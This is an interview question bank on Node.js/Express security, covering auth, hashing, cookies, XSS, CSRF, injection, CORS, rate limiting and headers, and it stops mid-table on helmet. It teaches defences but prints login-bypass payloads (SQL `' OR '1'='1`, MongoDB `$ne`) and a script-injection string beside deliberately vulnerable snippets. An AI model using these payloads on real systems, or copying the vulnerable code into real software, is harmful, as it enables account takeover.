# Security, Auth & Best Practices Interview Questions & Answers

A curated bank of interview questions covering application security for Node.js/Express APIs: authentication vs authorization, password hashing, sessions and JWTs, cookies, the OWASP Top 10, XSS, CSRF, injection (SQL and NoSQL), CORS, security headers, rate limiting, input validation, secrets management, and HTTPS. The questions are grouped by difficulty and written to reflect what interviewers actually ask — and what separates a candidate who has *read about* security from one who has *shipped secure systems*.

Security is the area where confident-sounding wrong answers do the most damage, so the model answers here lean hard on *why* and on concrete, modern, runnable code.

## How to use this bank

- **First pass (learning):** Read each question, attempt your own answer out loud, then compare with the model answer. The goal is not memorization but understanding *why* each defense works and what it does **not** protect against.
- **Second pass (drilling):** Cover the answers and quiz yourself. If you cannot explain a threat model from first principles — *who* the attacker is and *what* they can do — revisit the relevant course module.
- **Last-minute revision:** Jump straight to the [Rapid-Fire Quick Answers](#rapid-fire-quick-answers) table at the bottom.
- **Code/output-prediction questions:** Some questions ask you to spot the vulnerability in a snippet. Trace the attacker's input by hand before reading the answer — interviewers care far more about *how you reason about untrusted input* than about whether you memorized an API.

> TIP: In a real interview, a strong security answer names the **threat** ("an attacker who can run JS in another user's browser"), the **defense**, and the **limits of that defense**. Saying "use helmet" is junior; saying "helmet sets HTTP response headers like CSP and HSTS, which is defense-in-depth but does not fix an injection bug in my own templating" is senior. The model answers below are written in that spirit — trim them to ~60 seconds when speaking.

> WARNING — The cardinal rule of security: **Never roll your own crypto, your own auth tokens, or your own escaping.** Use vetted, maintained libraries (`bcrypt`/`argon2`, `jsonwebtoken`, `helmet`, an ORM/ODM's parameterization). Interviewers actively listen for candidates who want to hand-write a "simple" hash or token scheme — that is a red flag.

---

## Beginner

### 1. **What is the difference between authentication and authorization?**

They are two distinct steps that beginners constantly conflate.

- **Authentication (AuthN) — "Who are you?"** Verifying the identity of the caller. Logging in with email + password, validating a JWT, or checking a session cookie are all authentication.
- **Authorization (AuthZ) — "What are you allowed to do?"** Deciding whether the *already-identified* caller may perform a specific action on a specific resource. Checking `user.role === "admin"` or "does this user own this document?" is authorization.

Authentication always comes first: you cannot decide what someone is allowed to do until you know who they are. The classic mnemonic: **AuthN = identity, AuthZ = permissions.**

```js
// Express middleware making the two steps explicit and separate.

// AuthN: verify identity, attach the user to the request.
function authenticate(req, res, next) {
  const user = getUserFromToken(req.headers.authorization); // verify token/session
  if (!user) return res.status(401).json({ error: "Not authenticated" }); // 401
  req.user = user;
  next();
}

// AuthZ: check permissions for THIS user on THIS action.
function requireAdmin(req, res, next) {
  if (req.user.role !== "admin") {
    return res.status(403).json({ error: "Forbidden" }); // 403, NOT 401
  }
  next();
}

app.delete("/users/:id", authenticate, requireAdmin, deleteUserHandler);
```

A telling detail interviewers probe: the **HTTP status codes**. `401 Unauthorized` means "you are not authenticated (or your credentials are invalid) — log in." `403 Forbidden` means "we know who you are, but you are not allowed." Despite its name, `401` is about authentication; `403` is about authorization.

> Follow-up: "A logged-in user requests `/users/999/orders` and sees someone else's orders — which step failed?" (Authorization — specifically a *broken object-level authorization* / IDOR bug.)

---

### 2. **Why must you hash passwords instead of storing them in plain text or encrypting them?**

If your database is ever leaked — and breaches happen constantly — plain-text passwords hand attackers every account immediately, plus every *other* site where users reused that password. So passwords must never be recoverable from what you store.

- **Hashing** is a *one-way* function: given the password you can compute the hash, but given the hash you cannot feasibly reverse it. At login, you hash the submitted password and compare it to the stored hash. You never need the original back.
- **Encryption** is the wrong tool because it is *reversible*: it requires a key, and whoever has the key (an attacker who also steals it, or a malicious insider) can decrypt every password. Encryption protects data you legitimately need to read back later; passwords are not such data.

So the rule is: **encrypt data you need to read; hash data you only need to verify.** Passwords fall squarely in the "verify" bucket.

> WARNING — Pitfall: A surprising number of candidates say "I'd encrypt the passwords." That signals a fundamental misunderstanding. The correct word is *hash*, and specifically a *slow, salted password hash* (see Q3 and Q15).

> Follow-up: "Which hashing algorithm would you use, and why not SHA-256?" (see Q15).

---

### 3. **What is a salt, and what problem does it solve?**

A **salt** is a unique, random value generated per password and combined with the password before hashing. The salt is stored alongside the hash (it is **not** secret).

The problem it solves: without a salt, identical passwords produce identical hashes. That enables two attacks:

1. **Rainbow tables** — precomputed lookup tables mapping common passwords to their hashes. With a unique salt per user, a precomputed table is useless because the attacker would need a separate table per salt.
2. **Hash collision spotting** — if two users have the same hash, you instantly know they chose the same password, and cracking one cracks both.

A unique salt makes every stored hash distinct even for identical passwords, forcing the attacker to crack each one individually.

```js
const bcrypt = require("bcrypt");

// bcrypt GENERATES a random salt and EMBEDS it in the output string.
const hash = await bcrypt.hash("hunter2", 12); // 12 = cost factor (work factor)
console.log(hash);
// $2b$12$Nf3v...   <- the segments encode: algo $ cost $ salt+digest
//  ^algo ^cost ^the 22-char salt and the digest live right here

// At login you pass the PLAINTEXT and the STORED hash; bcrypt reads the
// salt and cost back out of the hash string automatically.
const ok = await bcrypt.compare("hunter2", hash); // true
```

The elegant part of bcrypt (and argon2): you do **not** manage salts yourself. The salt is generated internally and packed into the resulting hash string, so a single column stores algorithm, cost, salt, and digest together.

> Follow-up: "What about a *pepper*?" (A pepper is a secret value, the same for all users, kept *outside* the database — e.g., in an env var or HSM — and mixed in before hashing. It adds protection if only the DB leaks but not the app secret. It is optional and supplementary to per-user salts.)

---

### 4. **What are the key security flags on a cookie, and what does each do?**

When you set a cookie (e.g., a session ID), four attributes matter for security:

| Flag | What it does | Protects against |
| --- | --- | --- |
| `HttpOnly` | Cookie is inaccessible to `document.cookie` / JavaScript | Token theft via **XSS** |
| `Secure` | Cookie is only sent over HTTPS | Interception over plain HTTP (MITM) |
| `SameSite` | Restricts sending the cookie on cross-site requests | **CSRF** |
| `Domain` / `Path` | Scopes which hosts/paths receive the cookie | Over-broad cookie exposure |

`SameSite` has three values: `Strict` (never sent on any cross-site request), `Lax` (sent on top-level GET navigations but not on cross-site POST/AJAX — the modern browser default), and `None` (sent on all cross-site requests, but then `Secure` is mandatory).

```js
res.cookie("sessionId", id, {
  httpOnly: true,                 // JS in the browser cannot read it -> XSS-resistant
  secure: true,                   // HTTPS only (set false only on localhost dev)
  sameSite: "lax",                // good default; use "strict" for max CSRF protection
  maxAge: 1000 * 60 * 60 * 24,    // 1 day, in milliseconds
  path: "/",
});
```

> BEST PRACTICE: For a session/auth cookie, set `httpOnly: true`, `secure: true`, and `sameSite: "lax"` (or `"strict"`). These three together neutralize the two biggest cookie-theft vectors (XSS reading the token, CSRF abusing it).

> Follow-up: "Why does `httpOnly` not *prevent* XSS?" (It does not stop the script from running — it only stops that script from *reading the cookie value*. The XSS bug still exists and can do plenty of other damage.)

---

### 5. **What is XSS (Cross-Site Scripting), and how do you prevent it?**

**XSS** is an injection vulnerability where an attacker gets the browser to execute *their* JavaScript in the context of *your* site. Because the script runs with your site's origin, it can read non-`HttpOnly` cookies, make authenticated requests, exfiltrate data, deface the page, or keylog.

The root cause is always the same: **untrusted input is rendered into a page without proper encoding**, so data is interpreted as code. The three classic types:

- **Stored XSS** — malicious input is saved (e.g., a comment containing `<script>`) and served to every viewer.
- **Reflected XSS** — input from the request (a query param) is echoed back in the response unescaped.
- **DOM-based XSS** — client-side JS writes untrusted data into the DOM via sinks like `innerHTML`.

Prevention, in order of importance:

1. **Output encoding / contextual escaping.** Escape data for the context it lands in (HTML body, attribute, JS, URL). Modern template engines auto-escape by default — *do not disable it*.
2. **Avoid dangerous sinks.** Prefer `textContent` over `innerHTML`; in React, never use `dangerouslySetInnerHTML` with untrusted data.
3. **Sanitize rich HTML** when you must allow it (e.g., a WYSIWYG editor) with a vetted library like `DOMPurify`.
4. **Content Security Policy (CSP)** as defense-in-depth — restrict where scripts may load from so even injected scripts are blocked.
5. **`HttpOnly` cookies** so a successful XSS cannot steal the session token.

```js
// VULNERABLE: reflecting user input straight into HTML.
app.get("/hello", (req, res) => {
  res.send(`<h1>Hello ${req.query.name}</h1>`); // ?name=<script>steal()</script>
});

// SAFER: escape, or render via an auto-escaping template engine.
const escapeHtml = (s) =>
  String(s).replace(/[&<>"']/g, (c) =>
    ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));

app.get("/hello", (req, res) => {
  res.send(`<h1>Hello ${escapeHtml(req.query.name)}</h1>`);
});
```

> WARNING — Pitfall: Input validation is **not** the primary XSS defense. The right place to stop XSS is at *output* time, encoded for the specific context. Validation helps but cannot anticipate every sink.

> Follow-up: "If your API only returns JSON and never renders HTML, where does XSS risk come from?" (Mostly the front-end consuming that JSON — XSS is ultimately a *browser rendering* problem. Also `Content-Type` sniffing and reflected JSON injected into HTML.)

---

### 6. **What is CSRF (Cross-Site Request Forgery), and how do you defend against it?**

**CSRF** tricks a logged-in user's browser into sending an unwanted, authenticated request to your site. The attacker hosts a malicious page; when the victim (still logged into `yourbank.com`) visits it, the page auto-submits a form or fires a request to `yourbank.com/transfer`. Because the browser **automatically attaches cookies** to requests for that domain, the request arrives fully authenticated — even though the user never intended it.

The crucial insight: **CSRF exploits the browser's automatic, ambient credential attachment (cookies).** The attacker never sees the response or the cookie; they just cause a state-changing request to fire.

Defenses:

1. **`SameSite` cookies** (`Lax` or `Strict`) — the modern first line of defense. The browser refuses to send the cookie on cross-site POST requests, defeating most CSRF.
2. **CSRF tokens (synchronizer token pattern)** — the server embeds a random, per-session token in forms; the attacker's page cannot read it (same-origin policy), so forged requests lack a valid token.
3. **Double-submit cookie** pattern as a stateless alternative.
4. **Checking `Origin` / `Referer` headers** on state-changing requests.

```js
// Modern minimal defense: a SameSite cookie.
res.cookie("sessionId", id, { httpOnly: true, secure: true, sameSite: "lax" });

// Plus an explicit CSRF token for forms (using csrf-csrf, since csurf is deprecated).
const { doubleCsrf } = require("csrf-csrf");
const { doubleCsrfProtection, generateToken } = doubleCsrf({
  getSecret: () => process.env.CSRF_SECRET,
  cookieName: "__Host-csrf",
});
app.get("/form", (req, res) => res.send(renderForm(generateToken(req, res))));
app.post("/transfer", doubleCsrfProtection, transferHandler);
```

A key nuance: **APIs that authenticate with a `Authorization: Bearer <token>` header (not cookies) are largely immune to classic CSRF**, because the browser does not automatically attach custom headers. CSRF is fundamentally a *cookie-based-auth* problem.

> Follow-up: "You're building a pure JSON API with JWT in the `Authorization` header — do you need CSRF tokens?" (Generally no, because there is no ambient cookie to forge. But if you *also* store the JWT in a cookie, CSRF risk returns.)

---

### 7. **What is SQL injection, and how do parameterized queries prevent it?**

**SQL injection (SQLi)** happens when untrusted input is concatenated into a SQL string, letting an attacker change the *structure* of the query — reading other rows, dumping the whole table, bypassing login, or even dropping tables. It is consistently among the most damaging web vulnerabilities.

The root cause: **mixing code (SQL) and data (user input) in the same string.** When `' OR '1'='1` is pasted into a `WHERE` clause, the quote breaks out of the data context and becomes part of the query logic.

```js
// VULNERABLE: string concatenation. Input "' OR '1'='1" bypasses the check.
const q = `SELECT * FROM users WHERE email = '${req.body.email}'
           AND password = '${req.body.password}'`;
db.query(q); // attacker logs in as the first user without a valid password

// SAFE: parameterized query (prepared statement). Input is sent SEPARATELY
// from the SQL text, so the driver always treats it as DATA, never code.
db.query(
  "SELECT * FROM users WHERE email = $1 AND password = $2",
  [req.body.email, req.body.password] // values bound as parameters
);
```

**Parameterized queries (a.k.a. prepared statements)** fix this by sending the SQL template and the values over separate channels. The database compiles the query structure first, then binds the values as pure data — there is no way for a value to alter the query's meaning. This is the single most important SQLi defense, far more reliable than trying to escape or blacklist characters.

> BEST PRACTICE: Always use parameterized queries or a well-known ORM/query builder (Prisma, Knex, Sequelize) that parameterizes for you. Never build SQL with string concatenation or template literals containing user input. Apply least-privilege DB accounts so even a successful injection has limited blast radius.

> Follow-up: "What about the table/column name — can you parameterize that?" (No — placeholders only bind *values*, not identifiers. For dynamic column/table names you must validate against an allowlist.)

---

### 8. **What is HTTPS, and why is it essential for an API that handles credentials?**

**HTTPS** is HTTP layered over **TLS** (Transport Layer Security). It provides three guarantees for data in transit:

1. **Confidentiality (encryption)** — eavesdroppers on the network see ciphertext, not your passwords or tokens.
2. **Integrity** — tampering with the data in transit is detected.
3. **Authentication of the server** — the TLS certificate proves you are talking to the real server, not an impostor (defends against MITM).

Without HTTPS, every credential, session cookie, and bearer token travels in clear text across every router and Wi-Fi access point between client and server — trivially sniffable. That is why `Secure` cookies, HSTS, and login over plaintext are non-negotiable issues.

In practice, you rarely terminate TLS in Node itself in production; a reverse proxy or load balancer (Nginx, a cloud LB) handles certificates, and Node speaks HTTP behind it. But you must then trust the proxy correctly:

```js
// Behind a TLS-terminating proxy (Nginx, AWS ELB, Heroku, etc.):
app.set("trust proxy", 1); // so req.secure / req.ip reflect the X-Forwarded-* headers

// Force HTTPS + enable HSTS (helmet does HSTS for you, see Q19).
app.use((req, res, next) => {
  if (req.secure) return next();
  res.redirect(308, `https://${req.headers.host}${req.url}`);
});
```

> TIP: Use **HSTS** (`Strict-Transport-Security`) so browsers refuse to ever connect over plain HTTP after the first visit, closing the initial-redirect MITM window. Free, automated certs come from Let's Encrypt.

> Follow-up: "What's the difference between TLS termination at the proxy vs end-to-end TLS?" (At the proxy, traffic from proxy to app may be plain HTTP on a trusted network; end-to-end re-encrypts that hop too, needed in zero-trust environments.)

---

### 9. **How should secrets (DB passwords, API keys, JWT signing keys) be managed in a Node app?**

The core principle: **secrets must never live in source code or be committed to version control.** A leaked Git history is one of the most common breach causes.

The standard layering:

1. **Local development:** keep secrets in a `.env` file that is **git-ignored**, and load it with `process.env` (Node has built-in `--env-file` support; the `dotenv` package is the classic alternative). Commit a `.env.example` with *keys but no values* so teammates know what is required.
2. **Production:** inject secrets via the platform's environment / secret manager — AWS Secrets Manager, HashiCorp Vault, GCP Secret Manager, Doppler, or the host's encrypted env vars. Not a file on disk.
3. **Access via `process.env`** in code, validated at startup so the app fails fast if a required secret is missing.

```bash
# .gitignore MUST contain:
.env
.env.local
```

```js
// Load env (Node >= 20.6 can do: node --env-file=.env app.js, no package needed).
require("dotenv").config();

// Fail fast at startup if a critical secret is absent.
const required = ["DATABASE_URL", "JWT_SECRET"];
for (const key of required) {
  if (!process.env[key]) throw new Error(`Missing required env var: ${key}`);
}

const jwtSecret = process.env.JWT_SECRET; // never hard-coded
```

> WARNING — Pitfall: Hard-coding even a "temporary" key, or committing `.env`, is a frequent real-world breach. Once a secret hits Git history, treat it as compromised and **rotate it** — deleting the commit is not enough, since it lives in clones and forks.

> BEST PRACTICE: Validate and centralize config at boot (e.g., with a schema via `zod`/`envalid`), keep different secrets per environment, and rotate secrets periodically and immediately after any suspected exposure.

---

### 10. **What is input validation, and how does it differ from sanitization?**

Both deal with untrusted input, but they have different jobs:

- **Validation** answers "is this input *acceptable*?" — it *rejects* anything that does not match the expected shape, type, range, or format (e.g., "email must be a valid email," "age must be an integer 0–120"). Invalid input is refused with a `400 Bad Request`.
- **Sanitization** answers "how do I make this input *safe to use*?" — it *transforms* input by removing or escaping dangerous parts (e.g., stripping HTML tags, trimming whitespace, encoding for output).

The mental model: **validate to reject bad input; sanitize/encode to safely handle input you accept.** They are complementary, not alternatives.

```js
const { z } = require("zod"); // schema validation library

const SignupSchema = z.object({
  email: z.string().email(),                 // validation: must be an email
  age: z.number().int().min(13).max(120),    // validation: type + range
  bio: z.string().max(500),                  // validation: length
});

app.post("/signup", (req, res) => {
  const parsed = SignupSchema.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ errors: parsed.error.issues }); // reject
  }
  // parsed.data is now typed and validated; sanitize/encode at OUTPUT time.
  createUser(parsed.data);
  res.status(201).end();
});
```

> BEST PRACTICE: Validate on the **server** always (client-side validation is a UX nicety, not a security control — attackers bypass the client entirely). Prefer **allowlists** ("only these values are valid") over blocklists ("everything except these bad values"), because you can never enumerate all bad inputs.

> Follow-up: "Where should you sanitize for XSS — on input or output?" (Encode at *output*, contextually; sanitizing on input loses the original data and cannot know the future output context.)

---

## Intermediate

### 11. **Compare server-side sessions vs JWTs for authentication. When would you choose each?**

Both maintain "logged-in" state across stateless HTTP requests, but the trust model differs fundamentally.

- **Sessions (stateful):** On login, the server creates a session record (in memory, Redis, or a DB) and sends the client an opaque **session ID** in a cookie. Each request, the server looks up the ID to find the user. State lives on the **server**.
- **JWTs (stateless):** On login, the server issues a **signed token** containing the user's claims (id, role, expiry). The client sends it back each request; the server **verifies the signature** and trusts the embedded claims without a lookup. State lives in the **token**.

| Aspect | Sessions | JWT |
| --- | --- | --- |
| Server storage | Required (Redis/DB) | None (stateless) |
| Revocation | Easy — delete the session | Hard — token is valid until it expires |
| Scaling | Needs shared session store | Naturally horizontal |
| Payload visibility | Opaque ID | Claims are readable (base64, **not encrypted**) |
| Size per request | Small (just an ID) | Larger (whole token) |
| Typical transport | Cookie | `Authorization: Bearer` header (or cookie) |
| CSRF exposure | Yes (cookie-based) | No, if sent via header |
| Best fit | Traditional web apps, when you need instant logout/revocation | APIs, microservices, mobile, third-party clients |

The decisive trade-off interviewers want to hear: **revocation vs statelessness.** Sessions let you kill a login instantly (delete the record); JWTs cannot be un-issued, so a stolen or to-be-revoked token stays valid until expiry. This is why JWTs use *short* access-token lifetimes plus refresh tokens (see Q13), and why "logout" with pure JWT is awkward.

> WARNING — Pitfall: A JWT's payload is **signed, not encrypted** — anyone can base64-decode and read the claims. Never put secrets (passwords, PII you wouldn't expose) in a JWT.

> Follow-up: "How do you revoke a JWT before it expires?" (Short expiry + refresh tokens; a server-side denylist of revoked token IDs (`jti`); or rotating the signing key. All reintroduce some statefulness — the honest trade-off.)

---

### 12. **Where should you store a JWT on the client, and what are the trade-offs?**

This is one of the most debated front-end security questions, and there is no perfect answer — only trade-offs between two threats: **XSS** and **CSRF**.

| Storage | Vulnerable to | Notes |
| --- | --- | --- |
| `localStorage` / `sessionStorage` | **XSS** (any JS can read it) | Convenient, but a single XSS = token stolen. Not CSRF-prone (not auto-sent). |
| `HttpOnly` cookie | **CSRF** (auto-attached) | JS cannot read it -> XSS can't steal it; but needs CSRF defenses. |
| In-memory (JS variable) | Lost on refresh; still XSS-readable while live | Most XSS-resistant for persistence (gone on reload), often paired with a refresh-token cookie. |

The increasingly recommended pattern: **store the short-lived access token in memory, and the long-lived refresh token in an `HttpOnly`, `Secure`, `SameSite` cookie scoped to the refresh endpoint.** This minimizes XSS exposure (no token sits in `localStorage`) while keeping the powerful refresh token out of JS reach.

```js
// Server issues access token in the body (kept in memory by the SPA)
// and refresh token in a hardened, path-scoped cookie.
res.cookie("refreshToken", refreshToken, {
  httpOnly: true,
  secure: true,
  sameSite: "strict",
  path: "/auth/refresh", // only sent to the refresh endpoint
  maxAge: 1000 * 60 * 60 * 24 * 7,
});
res.json({ accessToken }); // short-lived; client holds it in a JS variable
```

The senior point: **`localStorage` is convenient but means any XSS fully compromises the session.** Many teams accept that risk; security-conscious ones do not. There is genuine disagreement in the industry — what matters in an interview is that you can articulate the XSS-vs-CSRF trade-off rather than parroting "never use localStorage."

> Follow-up: "If you put the JWT in an HttpOnly cookie, what new defense do you now need?" (CSRF protection — `SameSite` and/or CSRF tokens.)

---

### 13. **What are refresh tokens, and how does the access-token + refresh-token pattern work?**

The pattern exists to resolve the core JWT tension: you want tokens to be **short-lived** (so a stolen one expires fast and revocation matters less) but you don't want to force users to log in every few minutes.

- **Access token:** short-lived (e.g., 5–15 minutes), sent with every API request, carries the user's claims. If stolen, it's useless soon.
- **Refresh token:** long-lived (days/weeks), stored more securely (HttpOnly cookie or secure storage), used **only** to obtain a new access token from a dedicated `/refresh` endpoint. Never sent to regular API routes.

Flow:

1. Login → server returns an access token + a refresh token.
2. Client uses the access token until it expires (gets `401`).
3. Client calls `/auth/refresh` with the refresh token → server validates it and issues a fresh access token (and often a new refresh token).
4. Logout / compromise → server invalidates the refresh token (this *is* server-side state, but only one small record per session).

```js
const jwt = require("jsonwebtoken");

function issueTokens(user) {
  const accessToken = jwt.sign(
    { sub: user.id, role: user.role },
    process.env.JWT_ACCESS_SECRET,
    { expiresIn: "15m" } // short
  );
  const refreshToken = jwt.sign(
    { sub: user.id, jti: crypto.randomUUID() }, // jti lets us track/revoke it
    process.env.JWT_REFRESH_SECRET,
    { expiresIn: "7d" } // long
  );
  return { accessToken, refreshToken };
}
```

> BEST PRACTICE: Use **refresh-token rotation** — each refresh issues a new refresh token and invalidates the old one. If an old (already-used) refresh token is ever replayed, that signals theft, and you revoke the whole token family ("reuse detection"). Store refresh tokens (or their `jti`) server-side so you *can* revoke them.

> Follow-up: "Doesn't tracking refresh tokens make the system stateful again, defeating JWT's purpose?" (Partly yes — but you only store a tiny revocation record per session, not full session state per request. It's a pragmatic middle ground.)

---

### 14. **What is NoSQL injection (e.g., in MongoDB), and how does it differ from SQL injection?**

NoSQL databases are *not* immune to injection. With MongoDB and Mongoose, the classic attack abuses the fact that query filters are **objects**, and Express/`body-parser` will happily parse a JSON or even URL-encoded body into nested objects containing **query operators** like `$gt`, `$ne`, or `$regex`.

```js
// VULNERABLE login. Expects { email, password } as strings.
const user = await User.findOne({
  email: req.body.email,
  password: req.body.password,
});

// Attacker sends JSON:
//   { "email": "admin@site.com", "password": { "$ne": null } }
// The filter becomes: { email: "...", password: { $ne: null } }
// -> matches the admin regardless of the real password. Auth bypass.
```

So instead of breaking out of a string (as in SQLi), the attacker **smuggles a query operator object** where the app expected a primitive. Other variants use `$where` (server-side JS execution) or `$regex` for blind extraction / ReDoS.

Defenses:

1. **Validate types** — ensure inputs that should be strings *are* strings before querying. A schema validator (`zod`, `joi`) rejecting non-string `password` stops the attack cold.
2. **Sanitize input** — `express-mongo-sanitize` strips keys starting with `$` or containing `.` from `req.body`/`req.query`/`req.params`.
3. **Use Mongoose schemas with `SchemaType` casting** — declaring `password: String` makes Mongoose cast/coerce, though casting alone is not a complete defense.
4. **Avoid `$where` and raw user-built queries.**

```js
const mongoSanitize = require("express-mongo-sanitize");
app.use(mongoSanitize()); // removes $ and . from keys in req.body/query/params

// Plus explicit type validation before the query:
if (typeof req.body.password !== "string") {
  return res.status(400).json({ error: "Invalid input" });
}
```

> WARNING — Pitfall: People assume "NoSQL = no injection." False. The *shape* of the attack changes (operator objects instead of broken quotes), but the root cause — trusting untrusted input in a query — is identical.

> Follow-up: "How would `email: { $ne: null }, password: { $ne: null }` behave on a `findOne`?" (Returns the first user in the collection — a full auth bypass if you then treat the match as authenticated.)

---

### 15. **Why use bcrypt (or argon2) for passwords instead of MD5 or SHA-256?**

Because MD5 and the SHA family are **fast general-purpose hashes** — designed to be computed quickly over large data — and *speed is exactly what you do not want* for passwords. On modern GPUs/ASICs an attacker can compute *billions* of SHA-256 hashes per second, so a leaked SHA-256 password database can be brute-forced or dictionary-attacked at enormous rates, even when salted.

**bcrypt** (and **argon2**, **scrypt**, **PBKDF2**) are **deliberately slow, adaptive (tunable) password hashing functions.** They expose a *cost/work factor* you increase over time as hardware gets faster, so each guess stays expensive. bcrypt also has a built-in salt. argon2 additionally is *memory-hard* (resists GPU/ASIC attacks by requiring lots of RAM per hash) and is the current recommendation (argon2id) from OWASP.

| Property | MD5 / SHA-256 | bcrypt / argon2 |
| --- | --- | --- |
| Designed for | Fast, general hashing | Slow password storage |
| Built-in salt | No | Yes |
| Tunable cost | No | Yes (work/cost factor) |
| Memory-hard | No | argon2/scrypt: yes |
| Suitable for passwords | **No** | **Yes** |

```js
const bcrypt = require("bcrypt");

// Cost factor 12 -> 2^12 iterations. Tune so a hash takes ~250-350ms on YOUR hardware.
const hash = await bcrypt.hash(plainPassword, 12);

// Verify (constant-time comparison is handled internally).
const valid = await bcrypt.compare(submittedPassword, hash);
```

> WARNING — Pitfall: "I'll use SHA-256 with a salt" is a *better* wrong answer than plain MD5, but still wrong: salting defeats rainbow tables but does nothing about raw cracking speed. The defining property for password hashing is *slowness/cost*, which SHA does not provide.

> WARNING — bcrypt truncates input at **72 bytes**. For very long passwords or to combine with a pepper, pre-hash with SHA-256 first or use argon2 which has no such limit.

> Follow-up: "How do you pick the cost factor?" (Benchmark on your production hardware; aim for ~250–350 ms per hash — slow enough to hurt attackers, fast enough not to DoS your login endpoint.)

---

### 16. **What is the OWASP Top 10, and can you name several categories?**

The **OWASP Top 10** is a regularly updated, industry-standard awareness document from the Open Worldwide Application Security Project listing the most critical web application security risks. It is *not* a checklist or a standard — it's a prioritized starting point for what to defend against, and it's a near-guaranteed interview topic.

Key categories (2021 edition, the current widely-referenced list):

1. **A01 Broken Access Control** — users acting outside their permissions (IDOR, missing AuthZ checks). The #1 risk.
2. **A02 Cryptographic Failures** — weak/missing encryption, plaintext secrets, bad password hashing.
3. **A03 Injection** — SQL/NoSQL/command/LDAP injection, and XSS lives here too.
4. **A04 Insecure Design** — flaws baked into the architecture, not just bugs.
5. **A05 Security Misconfiguration** — default creds, verbose errors, missing headers, open cloud buckets.
6. **A06 Vulnerable & Outdated Components** — using dependencies with known CVEs.
7. **A07 Identification & Authentication Failures** — weak auth, credential stuffing, poor session management.
8. **A08 Software & Data Integrity Failures** — insecure deserialization, unsigned updates, CI/CD tampering.
9. **A09 Security Logging & Monitoring Failures** — can't detect or investigate breaches.
10. **A10 Server-Side Request Forgery (SSRF)** — server tricked into making requests to internal resources.

You won't be expected to recite all ten verbatim, but a strong candidate names several, knows **A01 Broken Access Control is now #1**, and can map each to a concrete Node/Express mitigation.

> TIP: Connect categories to your stack to impress: "A03 Injection → parameterized queries + `express-mongo-sanitize`; A02 → bcrypt + HTTPS + secret manager; A05 → helmet + disabling `x-powered-by`; A06 → `npm audit` + Dependabot."

> Follow-up: "Which moved to #1 in 2021 and why?" (Broken Access Control — it was the most common serious issue found in real-world testing.)

---

### 17. **What is CORS, what problem does it solve, and what is a preflight request?**

**CORS (Cross-Origin Resource Sharing)** is a *browser* mechanism that relaxes the **Same-Origin Policy (SOP)** in a controlled way. SOP, by default, blocks JavaScript on `https://app.com` from reading responses from `https://api.other.com` (a different *origin* = scheme + host + port). CORS lets a server explicitly opt in to which cross-origin sites may read its responses, via response headers like `Access-Control-Allow-Origin`.

Two critical clarifications interviewers test:

1. **CORS is enforced by the browser, not the server.** The server just sends headers; the *browser* decides whether to expose the response to the calling JS. Tools like `curl` or another server ignore CORS entirely — so CORS is **not** an access-control mechanism for your API's security. It controls *which web pages can read your responses*, not who can call your API.
2. **CORS loosens, never tightens.** It can only grant access SOP would otherwise deny.

A **preflight request** is an automatic `OPTIONS` request the browser sends *before* certain "non-simple" cross-origin requests — those using methods like `PUT`/`DELETE`, custom headers (e.g., `Authorization`, `Content-Type: application/json`), etc. The browser asks the server "are these method/headers allowed?" via `Access-Control-Request-Method`/`-Headers`; the server answers with `Access-Control-Allow-Methods`/`-Headers`. Only if approved does the real request go out.

```js
const cors = require("cors");

// Allowlist specific origins; DO NOT reflect arbitrary origins blindly.
app.use(cors({
  origin: ["https://app.example.com"],   // not "*", especially with credentials
  methods: ["GET", "POST", "PUT", "DELETE"],
  allowedHeaders: ["Content-Type", "Authorization"],
  credentials: true,                      // allow cookies; requires a specific origin
  maxAge: 86400,                          // cache the preflight result for 24h
}));
```

> WARNING — Pitfall: You **cannot** use `Access-Control-Allow-Origin: *` together with `credentials: true` — browsers reject it. With credentials you must echo a specific allowed origin. Also never just reflect `req.headers.origin` back unconditionally; that effectively allows everyone.

> Follow-up: "What makes a request 'simple' and thus skip preflight?" (GET/HEAD/POST with only safelisted headers and a `Content-Type` of `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`.)

---

### 18. **What is rate limiting, why is it important, and how would you implement it in Express?**

**Rate limiting** caps how many requests a client may make in a time window. It defends against:

- **Brute-force / credential-stuffing** attacks on login and password-reset endpoints.
- **Denial-of-Service (DoS)** and resource exhaustion.
- **Scraping and API abuse**, and runaway costs on expensive endpoints.

The basic implementation in Express uses `express-rate-limit`. For production at scale you back it with a shared store (Redis) so the limit is enforced across all your instances, not per-process.

```js
const rateLimit = require("express-rate-limit");

// Global, lenient limit.
const generalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100,                 // 100 requests per IP per window
  standardHeaders: true,    // RateLimit-* headers
  legacyHeaders: false,
});
app.use(generalLimiter);

// Strict limit on auth endpoints to throttle brute force.
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,                   // only 5 login attempts per IP per 15 min
  message: { error: "Too many login attempts, try again later." },
});
app.post("/login", loginLimiter, loginHandler);
```

> WARNING — Pitfall: If you run behind a proxy/load balancer and don't set `app.set("trust proxy", ...)`, every request appears to come from the proxy's IP, so you either rate-limit *everyone* together or key on the wrong IP. Configure `trust proxy` so `req.ip` reflects the real client via `X-Forwarded-For`.

> BEST PRACTICE: Apply *stricter* limits to sensitive endpoints (login, signup, password reset, OTP) than to general reads. Combine with account lockout / exponential backoff and consider rate limiting by account/key, not just IP (NATs and IPv6 make IP alone unreliable). At scale, use a Redis-backed store so limits are global.

> Follow-up: "How is rate limiting different from throttling/load shedding?" (Rate limiting is per-client policy; load shedding drops requests to protect the server under overall overload regardless of client.)

---

### 19. **What does helmet do, and what are the most important security headers?**

**helmet** is Express middleware that sets a bundle of HTTP **response headers** with secure defaults, hardening the browser's handling of your responses. It is pure defense-in-depth — it doesn't fix logic bugs, but it shrinks the attack surface for free.

```js
const helmet = require("helmet");
app.use(helmet()); // sensible secure defaults

// CSP is NOT fully restrictive by default-tune it for your app.
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    objectSrc: ["'none'"],
  },
}));
```

The headers that matter most:

| Header | Purpose |
| --- | --- |
| `Content-Security-Policy` | Restricts where scripts/styles/images may load from — strongest **XSS** mitigation |
| `Strict-Transport-Security` (HSTS) | Forces HTTPS for future visits, prevents protocol downgrade |
